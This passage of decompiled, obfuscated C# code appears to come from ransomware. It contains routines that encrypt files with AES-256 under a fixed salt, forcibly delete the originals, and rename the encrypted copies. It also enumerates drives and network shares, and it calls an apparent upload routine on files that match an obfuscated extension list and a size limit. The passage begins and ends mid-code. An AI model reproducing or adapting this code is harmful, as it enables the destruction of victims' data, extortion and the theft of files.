										File.AppendAllText(AIOBtLgIwjoLs, AAfgHfRmqtNe.getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + AAfgHfRmqtNe.getString_0(107387760) + ex12.Message + AAfgHfRmqtNe.getString_0(107396721));
									}
									catch (Exception)
									{
									}
								}
								rYmLUpWPpFDd++;
								return;
							}
						}
						if (intMyWSRTiS)
						{
							if (CS_0024_003C_003E8__locals0.HuMjnShEiYDem != AAfgHfRmqtNe.getString_0(107388318))
							{
								JrgWtVXefnyJtd(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + CS_0024_003C_003E8__locals0.HuMjnShEiYDem, bytes2);
							}
							else
							{
								JrgWtVXefnyJtd(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			CS_0024_003C_003E8__locals0.nvCiGIukQFkQKz.Remove(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
		});
	}

	private static void NfKUjHGMFaQF(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZQgJcWfPvJPQ == getString_0(107396935))
					{
						foreach (string item in CCPXDRhgflzG)
						{
							if (string_0.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107396935))
							{
								if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107397192))
							{
								try
								{
									OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107388294)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107388294), getString_0(107391504)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void MCelMqaTtIYudae(string AUudaHqMgFcaYu, string WWLCWchPwaUH, byte[] UbmmOoDhjAV, byte[] QTVXUqBIpHFE = null)
	{
		try
		{
			if (ZQgJcWfPvJPQ == getString_0(107396935))
			{
				FileStream fileStream = new FileStream(AUudaHqMgFcaYu, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in CCPXDRhgflzG)
				{
					if (AUudaHqMgFcaYu.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107396935))
					{
						if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), AUudaHqMgFcaYu);
							}
							catch
							{
							}
						}
					}
					else if (AUudaHqMgFcaYu.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107397192))
					{
						try
						{
							OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), AUudaHqMgFcaYu);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (AUudaHqMgFcaYu != WWLCWchPwaUH)
		{
			File.Move(AUudaHqMgFcaYu, WWLCWchPwaUH);
			AUudaHqMgFcaYu = WWLCWchPwaUH;
		}
		byte[] bytes = RIdkSiOBtCCfM.LbymaNjlWfqxKnw(File.ReadAllBytes(AUudaHqMgFcaYu), UbmmOoDhjAV, QTVXUqBIpHFE);
		File.WriteAllBytes(AUudaHqMgFcaYu, bytes);
		vYQbqQWbSUgNb++;
	}

	private static void XhyOceWttqVUAc(string string_0, string string_1, byte[] byte_0)
	{
		jIoUzMoxORXEG CS_0024_003C_003E8__locals0 = new jIoUzMoxORXEG();
		CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX = string_0;
		CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string bYGkNDQUwHTZtcR = CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR;
			FileStream fileStream = new FileStream(bYGkNDQUwHTZtcR, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (GEhrwQCvgoMn == getString_0(107396935))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR.Length > 0)
				{
					if (ZQgJcWfPvJPQ == getString_0(107396935))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in CCPXDRhgflzG)
						{
							if (CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107396935))
							{
								if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107397192))
							{
								try
								{
									OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391553), getString_0(107391548), getString_0(107391567), CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR.EndsWith(getString_0(107388294)))
					{
						File.Move(CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR, CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR.Replace(getString_0(107388294), getString_0(107391504)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR))
							{
								File.Delete(CS_0024_003C_003E8__locals0.BYGkNDQUwHTZtcR);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388039) + CS_0024_003C_003E8__locals0.FVQCuNlnliiHQjX + getString_0(107387741) + ex2.Message + getString_0(107396702));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> source = afIyHEhrCnpR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387720)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source2 = zEPGrWzbUQpV;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (PVrYUzBrvLL == getString_0(107396935))
		{
			string[] source3 = kaCQkWvEmRwtDb;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), getString_0(107387650) + string_0 + getString_0(107387641));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!XOkMXYHVKKZne().Contains(getString_0(107388385)))
		{
			rwWAvGEeNhr(ErguQgjhMKVLnS);
		}
		else
		{
			List<string> sCdvQOqShIfe = SCdvQOqShIfe;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					OrQEYkCSRFdRrs(dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107387636))), string_0);
				};
			}
			Parallel.ForEach(sCdvQOqShIfe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source4 = xzDSpJguZcbP;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387611)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387720)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387675)), getString_0(107387650) + string_0 + getString_0(107387641));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		OrQEYkCSRFdRrs(dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107387636))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107387611)), string_0);
	}

	private static void _003CMapDrv_003Eb__17(string string_0)
	{
		MIqpuJIkrjBMR CS_0024_003C_003E8__locals0 = new MIqpuJIkrjBMR();
		CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI = string_0;
		if ((!CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387626)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387621)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387580)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107391504))) || !MCBYlisTSRSS.twkNavOPtUd(CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI))
		{
			return;
		}
		try
		{
			Thread.Sleep(uZwmuWmXUPb);
			SCtDlgPmJoxb.Add(getString_0(107390519) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + getString_0(107387599));
			try
			{
				if (COsiatrWvUa)
				{
					Console.WriteLine(getString_0(107390519) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + getString_0(107387599));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(uZwmuWmXUPb);
				SCtDlgPmJoxb.Add(MIqpuJIkrjBMR.getString_0(107390525) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + MIqpuJIkrjBMR.getString_0(107396799) + (char)int_0 + MIqpuJIkrjBMR.getString_0(107405055));
				try
				{
					if (COsiatrWvUa)
					{
						Console.WriteLine(MIqpuJIkrjBMR.getString_0(107390525) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + MIqpuJIkrjBMR.getString_0(107396799) + (char)int_0 + MIqpuJIkrjBMR.getString_0(107405055));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static IuKjJmfJcVBFA()
	{
		Strings.CreateGetStringDelegate(typeof(IuKjJmfJcVBFA));
		GJaEJRItHBd = getString_0(107391403);
		ignBTzWcyfBJ = null;
		ZkQXlCKgLq = getString_0(107397192);
		ZnQTsnSydQf = getString_0(107387590);
		SCtDlgPmJoxb = new List<string>();
		pYmJKiQZCFtxWj = new List<string>();
		kxXDyGjuxJIkOF = getString_0(107397192);
		geYnJRldqTc = getString_0(107391504);
		QcVyigtSkYPoO = getString_0(107391504);
		OpvlVUeWPNde = getString_0(107391504);
		HDUaBrvPpWiZ = getString_0(107397192);
		nAQNcYgrPfbd = 0;
		eWnObXCrwa = getString_0(107397192);
		XbbYlNWZvxei = getString_0(107397192);
		GavejwdGXBtM = getString_0(107397192);
		YJrkkJhMpjz = getString_0(107387545);
		YipLIDiytJkIoMpj = getString_0(107397192);
		odhMhxtPBogI = getString_0(107397192);
		YgaAcejEvHw = getString_0(107397192);
		jsoiRzVmarLdbDEq = getString_0(107397192);
		tpQHxZryBWxPYRj = new List<string>
		{
			dOioDTBjWKE(getString_0(107387540)),
			dOioDTBjWKE(getString_0(107387523)),
			dOioDTBjWKE(getString_0(107387530)),
			dOioDTBjWKE(getString_0(107387993)),
			dOioDTBjWKE(getString_0(107387968)),
			dOioDTBjWKE(getString_0(107387975)),
			dOioDTBjWKE(getString_0(107387926)),
			dOioDTBjWKE(getString_0(107387901)),
			dOioDTBjWKE(getString_0(107387908)),
			dOioDTBjWKE(getString_0(107387883)),
			dOioDTBjWKE(getString_0(107387834)),
			dOioDTBjWKE(getString_0(107387809)),
			dOioDTBjWKE(getString_0(107387816))
		};
		MoDypcoPNXgE = new List<string>();
		gzNBFyGUZAHaYj = getString_0(107397192);
		bhwSpcunnfDui = getString_0(107397192);
		xXWXzZCyuWyl = getString_0(107397192);
		eSzXPgKVtFvzPRkO = new List<string>();
		NlflDRvxbUWSt = getString_0(107397192);
		ZPIQxeyUyHA = getString_0(107387791);
		XedFtYAsIv = getString_0(107397192);
		xQXYhPfzOLMNVIZ = getString_0(107397192);
		gMnkSYDGfkIz = new List<string>
		{
			dOioDTBjWKE(getString_0(107387198)),
			dOioDTBjWKE(getString_0(107387165)),
			dOioDTBjWKE(getString_0(107387132)),
			dOioDTBjWKE(getString_0(107387099)),
			dOioDTBjWKE(getString_0(107387066)),
			dOioDTBjWKE(getString_0(107387037)),
			dOioDTBjWKE(getString_0(107387012)),
			dOioDTBjWKE(getString_0(107387495)),
			dOioDTBjWKE(getString_0(107387418)),
			dOioDTBjWKE(getString_0(107387353)),
			dOioDTBjWKE(getString_0(107387320)),
			dOioDTBjWKE(getString_0(107387287)),
			dOioDTBjWKE(getString_0(107387254)),
			dOioDTBjWKE(getString_0(107386713)),
			dOioDTBjWKE(getString_0(107386684)),
			dOioDTBjWKE(getString_0(107386675)),
			dOioDTBjWKE(getString_0(107386634)),
			dOioDTBjWKE(getString_0(107386577)),
			dOioDTBjWKE(getString_0(107386496)),
			dOioDTBjWKE(getString_0(107386975)),
			dOioDTBjWKE(getString_0(107386946)),
			dOioDTBjWKE(getString_0(107386905)),
			dOioDTBjWKE(getString_0(107386896)),
			dOioDTBjWKE(getString_0(107386863)),
			dOioDTBjWKE(getString_0(107386782)),
			dOioDTBjWKE(getString_0(107386757)),
			dOioDTBjWKE(getString_0(107386172)),
			dOioDTBjWKE(getString_0(107386143)),
			dOioDTBjWKE(getString_0(107386102)),
			dOioDTBjWKE(getString_0(107386045)),
			dOioDTBjWKE(getString_0(107385980)),
			dOioDTBjWKE(getString_0(107386435)),
			dOioDTBjWKE(getString_0(107386370)),
			dOioDTBjWKE(getString_0(107386353)),
			dOioDTBjWKE(getString_0(107386288)),
			dOioDTBjWKE(getString_0(107385687)),
			dOioDTBjWKE(getString_0(107385654)),
			dOioDTBjWKE(getString_0(107385645)),
			dOioDTBjWKE(getString_0(107385604)),
			dOioDTBjWKE(getString_0(107385527)),
			dOioDTBjWKE(getString_0(107385498)),
			dOioDTBjWKE(getString_0(107385945)),
			dOioDTBjWKE(getString_0(107385936)),
			dOioDTBjWKE(getString_0(107385903)),
			dOioDTBjWKE(getString_0(107385862)),
			dOioDTBjWKE(getString_0(107385781)),
			dOioDTBjWKE(getString_0(107385768)),
			dOioDTBjWKE(getString_0(107385151)),
			dOioDTBjWKE(getString_0(107385138)),
			dOioDTBjWKE(getString_0(107385093)),
			dOioDTBjWKE(getString_0(107385016)),
			dOioDTBjWKE(getString_0(107385007)),
			dOioDTBjWKE(getString_0(107385446)),
			dOioDTBjWKE(getString_0(107385417)),
			dOioDTBjWKE(getString_0(107385344)),
			dOioDTBjWKE(getString_0(107385279)),
			dOioDTBjWKE(getString_0(107385266)),
			dOioDTBjWKE(getString_0(107385205)),
			dOioDTBjWKE(getString_0(107384680)),
			dOioDTBjWKE(getString_0(107384615)),
			dOioDTBjWKE(getString_0(107384586)),
			dOioDTBjWKE(getString_0(107384529)),
			dOioDTBjWKE(getString_0(107384464)),
			dOioDTBjWKE(getString_0(107384935)),
			dOioDTBjWKE(getString_0(107384906)),
			dOioDTBjWKE(getString_0(107384833)),
			dOioDTBjWKE(getString_0(107384784)),
			dOioDTBjWKE(getString_0(107384723)),
			dOioDTBjWKE(getString_0(107384138)),
			dOioDTBjWKE(getString_0(107384061)),
			dOioDTBjWKE(getString_0(107384028)),
			dOioDTBjWKE(getString_0(107384019)),
			dOioDTBjWKE(getString_0(107383942)),
			dOioDTBjWKE(getString_0(107384377)),
			dOioDTBjWKE(getString_0(107384288)),
			dOioDTBjWKE(getString_0(107384271)),
			dOioDTBjWKE(getString_0(107384242)),
			dOioDTBjWKE(getString_0(107384201)),
			dOioDTBjWKE(getString_0(107383624)),
			dOioDTBjWKE(getString_0(107383543)),
			dOioDTBjWKE(getString_0(107383486)),
			dOioDTBjWKE(getString_0(107383453)),
			dOioDTBjWKE(getString_0(107383904)),
			dOioDTBjWKE(getString_0(107383879)),
			dOioDTBjWKE(getString_0(107385687)),
			dOioDTBjWKE(getString_0(107383822)),
			dOioDTBjWKE(getString_0(107383781)),
			dOioDTBjWKE(getString_0(107383692)),
			dOioDTBjWKE(getString_0(107383103)),
			dOioDTBjWKE(getString_0(107383042)),
			dOioDTBjWKE(getString_0(107383049)),
			dOioDTBjWKE(getString_0(107382972)),
			dOioDTBjWKE(getString_0(107382955)),
			dOioDTBjWKE(getString_0(107386045)),
			dOioDTBjWKE(getString_0(107383402)),
			dOioDTBjWKE(getString_0(107383329)),
			dOioDTBjWKE(getString_0(107383304)),
			dOioDTBjWKE(getString_0(107385980)),
			dOioDTBjWKE(getString_0(107383199)),
			dOioDTBjWKE(getString_0(107383182)),
			dOioDTBjWKE(getString_0(107382549)),
			dOioDTBjWKE(getString_0(107382484)),
			dOioDTBjWKE(getString_0(107382435)),
			dOioDTBjWKE(getString_0(107386370)),
			dOioDTBjWKE(getString_0(107382870)),
			dOioDTBjWKE(getString_0(107385654)),
			dOioDTBjWKE(getString_0(107386353)),
			dOioDTBjWKE(getString_0(107382837)),
			dOioDTBjWKE(getString_0(107382780)),
			dOioDTBjWKE(getString_0(107386288)),
			dOioDTBjWKE(getString_0(107382747)),
			dOioDTBjWKE(getString_0(107382730)),
			dOioDTBjWKE(getString_0(107382649)),
			dOioDTBjWKE(getString_0(107386102)),
			dOioDTBjWKE(getString_0(107382112)),
			dOioDTBjWKE(getString_0(107382099)),
			dOioDTBjWKE(getString_0(107382038)),
			dOioDTBjWKE(getString_0(107382009)),
			dOioDTBjWKE(getString_0(107381996)),
			dOioDTBjWKE(getString_0(107381963)),
			dOioDTBjWKE(getString_0(107381938)),
			dOioDTBjWKE(getString_0(107381893)),
			dOioDTBjWKE(getString_0(107382380)),
			dOioDTBjWKE(getString_0(107382307)),
			dOioDTBjWKE(getString_0(107382262)),
			dOioDTBjWKE(getString_0(107382245)),
			dOioDTBjWKE(getString_0(107382188)),
			dOioDTBjWKE(getString_0(107382155)),
			dOioDTBjWKE(getString_0(107381566)),
			dOioDTBjWKE(getString_0(107381533)),
			dOioDTBjWKE(getString_0(107381492)),
			dOioDTBjWKE(getString_0(107386143)),
			dOioDTBjWKE(getString_0(107382245)),
			dOioDTBjWKE(getString_0(107381483)),
			dOioDTBjWKE(getString_0(107381454)),
			dOioDTBjWKE(getString_0(107381425)),
			dOioDTBjWKE(getString_0(107381856)),
			dOioDTBjWKE(getString_0(107381815)),
			dOioDTBjWKE(getString_0(107381754)),
			dOioDTBjWKE(getString_0(107381713)),
			dOioDTBjWKE(getString_0(107381652)),
			dOioDTBjWKE(getString_0(107381651)),
			dOioDTBjWKE(getString_0(107381066)),
			dOioDTBjWKE(getString_0(107381037)),
			dOioDTBjWKE(getString_0(107380960)),
			dOioDTBjWKE(getString_0(107380895)),
			dOioDTBjWKE(getString_0(107380862)),
			dOioDTBjWKE(getString_0(107381361)),
			dOioDTBjWKE(getString_0(107381268)),
			dOioDTBjWKE(getString_0(107381267)),
			dOioDTBjWKE(getString_0(107381222)),
			dOioDTBjWKE(getString_0(107381157)),
			dOioDTBjWKE(getString_0(107381124)),
			dOioDTBjWKE(getString_0(107413307)),
			dOioDTBjWKE(getString_0(107413290)),
			dOioDTBjWKE(getString_0(107386782)),
			dOioDTBjWKE(getString_0(107413261)),
			dOioDTBjWKE(getString_0(107413172)),
			dOioDTBjWKE(getString_0(107413163)),
			dOioDTBjWKE(getString_0(107413598)),
			dOioDTBjWKE(getString_0(107413557)),
			dOioDTBjWKE(getString_0(107413544)),
			dOioDTBjWKE(getString_0(107413483)),
			dOioDTBjWKE(getString_0(107413402)),
			dOioDTBjWKE(getString_0(107413385)),
			dOioDTBjWKE(getString_0(107412816)),
			dOioDTBjWKE(getString_0(107412727)),
			dOioDTBjWKE(getString_0(107412714)),
			dOioDTBjWKE(getString_0(107412641)),
			dOioDTBjWKE(getString_0(107412616)),
			dOioDTBjWKE(getString_0(107386757)),
			dOioDTBjWKE(getString_0(107413023)),
			dOioDTBjWKE(getString_0(107412994)),
			dOioDTBjWKE(getString_0(107412961)),
			dOioDTBjWKE(getString_0(107412920)),
			dOioDTBjWKE(getString_0(107412891)),
			dOioDTBjWKE(getString_0(107386863)),
			dOioDTBjWKE(getString_0(107412882)),
			dOioDTBjWKE(getString_0(107412289)),
			dOioDTBjWKE(getString_0(107412292)),
			dOioDTBjWKE(getString_0(107384586)),
			dOioDTBjWKE(getString_0(107412227)),
			dOioDTBjWKE(getString_0(107412292)),
			dOioDTBjWKE(getString_0(107412230)),
			dOioDTBjWKE(getString_0(107412201)),
			dOioDTBjWKE(getString_0(107412172)),
			dOioDTBjWKE(getString_0(107412091)),
			dOioDTBjWKE(getString_0(107412586)),
			dOioDTBjWKE(getString_0(107412513)),
			dOioDTBjWKE(getString_0(107412484)),
			dOioDTBjWKE(getString_0(107412455)),
			dOioDTBjWKE(getString_0(107412382)),
			dOioDTBjWKE(getString_0(107412369)),
			dOioDTBjWKE(getString_0(107411812)),
			dOioDTBjWKE(getString_0(107411747)),
			dOioDTBjWKE(getString_0(107411722)),
			dOioDTBjWKE(getString_0(107411645)),
			dOioDTBjWKE(getString_0(107411620)),
			dOioDTBjWKE(getString_0(107412067)),
			dOioDTBjWKE(getString_0(107412026)),
			dOioDTBjWKE(getString_0(107411997)),
			dOioDTBjWKE(getString_0(107411936)),
			dOioDTBjWKE(getString_0(107411903)),
			dOioDTBjWKE(getString_0(107411878)),
			dOioDTBjWKE(getString_0(107411293)),
			dOioDTBjWKE(getString_0(107411276)),
			dOioDTBjWKE(getString_0(107411243)),
			dOioDTBjWKE(getString_0(107411162)),
			dOioDTBjWKE(getString_0(107411149)),
			dOioDTBjWKE(getString_0(107411068)),
			dOioDTBjWKE(getString_0(107411567)),
			dOioDTBjWKE(getString_0(107411486)),
			dOioDTBjWKE(getString_0(107411453)),
			dOioDTBjWKE(getString_0(107411412)),
			dOioDTBjWKE(getString_0(107411403)),
			dOioDTBjWKE(getString_0(107411326)),
			dOioDTBjWKE(getString_0(107381815)),
			dOioDTBjWKE(getString_0(107410781)),
			dOioDTBjWKE(getString_0(107410740)),
			dOioDTBjWKE(getString_0(107410683)),
			dOioDTBjWKE(getString_0(107410654)),
			dOioDTBjWKE(getString_0(107410621)),
			dOioDTBjWKE(getString_0(107410588)),
			dOioDTBjWKE(getString_0(107410571)),
			dOioDTBjWKE(getString_0(107411054)),
			dOioDTBjWKE(getString_0(107410977)),
			dOioDTBjWKE(getString_0(107410932)),
			dOioDTBjWKE(getString_0(107410923)),
			dOioDTBjWKE(getString_0(107410866)),
			dOioDTBjWKE(getString_0(107410273)),
			dOioDTBjWKE(getString_0(107410276)),
			dOioDTBjWKE(getString_0(107410199))
		};
		afIyHEhrCnpR = new List<string>
		{
			dOioDTBjWKE(getString_0(107410190)),
			dOioDTBjWKE(getString_0(107410109)),
			dOioDTBjWKE(getString_0(107410092)),
			dOioDTBjWKE(getString_0(107410523)),
			dOioDTBjWKE(getString_0(107410506)),
			dOioDTBjWKE(getString_0(107410441)),
			dOioDTBjWKE(getString_0(107410332)),
			dOioDTBjWKE(getString_0(107409759))
		};
		zEPGrWzbUQpV = new List<string>
		{
			dOioDTBjWKE(getString_0(107409734)),
			dOioDTBjWKE(getString_0(107409701)),
			dOioDTBjWKE(getString_0(107409624)),
			dOioDTBjWKE(getString_0(107409607)),
			dOioDTBjWKE(getString_0(107409574)),
			dOioDTBjWKE(getString_0(107410005)),
			dOioDTBjWKE(getString_0(107409992)),
			dOioDTBjWKE(getString_0(107409959)),
			dOioDTBjWKE(getString_0(107409926)),
			dOioDTBjWKE(getString_0(107409893)),
			dOioDTBjWKE(getString_0(107409860)),
			dOioDTBjWKE(getString_0(107409795)),
			dOioDTBjWKE(getString_0(107409242)),
			dOioDTBjWKE(getString_0(107409233)),
			dOioDTBjWKE(getString_0(107409188)),
			dOioDTBjWKE(getString_0(107409123)),
			dOioDTBjWKE(getString_0(107409082)),
			dOioDTBjWKE(getString_0(107409049)),
			dOioDTBjWKE(getString_0(107409040)),
			dOioDTBjWKE(getString_0(107409511)),
			dOioDTBjWKE(getString_0(107409478)),
			dOioDTBjWKE(getString_0(107409405)),
			dOioDTBjWKE(getString_0(107409372)),
			dOioDTBjWKE(getString_0(107409734)),
			dOioDTBjWKE(getString_0(107409363)),
			dOioDTBjWKE(getString_0(107409322)),
